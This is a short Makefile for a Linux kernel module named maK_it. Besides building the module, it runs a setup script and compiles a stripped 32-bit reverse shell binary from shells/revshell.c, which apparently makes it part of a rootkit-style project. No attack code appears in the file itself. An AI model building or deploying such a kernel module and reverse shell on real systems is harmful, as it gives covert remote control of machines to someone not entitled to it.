# If KERNELRELEASE is defined, we've been invoked from the
# kernel build system and can use its language.
ifneq ($(KERNELRELEASE),)
        obj-m := maK_it.o

# Otherwise we were called directly from the command
# line; invoke the kernel build system.
else
        KERNELDIR ?= /lib/modules/$(shell uname -r)/build
         PWD := $(shell pwd)
default:
	sh scripts/lets_maK_it.sh
	gcc -Wall -m32 -s -o shells/revshell shells/revshell.c
	make -C $(KERNELDIR) M=$(PWD) modules
endif
